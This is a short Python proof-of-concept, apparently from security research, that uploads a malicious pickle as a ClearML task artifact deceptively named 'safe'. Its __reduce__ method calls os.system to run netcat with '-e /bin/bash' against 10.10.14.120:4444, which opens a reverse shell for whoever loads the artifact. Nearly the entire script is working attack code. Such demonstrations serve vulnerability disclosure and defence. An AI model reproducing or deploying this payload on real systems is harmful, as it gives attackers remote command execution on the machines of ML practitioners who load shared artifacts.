from clearml import Task
import os

class RunCommand:
    def __reduce__(self):
        return (os.system, ('echo "Hacked by HiddenLayer" ; echo "Hacked over pickle loads" | nc 10.10.14.120 4444 -e /bin/bash',))

command = RunCommand()

task = Task.init(project_name='Black Swan', task_name='testing')
# task.upload_artifact(name="safe", artifact_object='pickle_artifact.pkl')
task.upload_artifact(name="safe", artifact_object=command)
print('test')
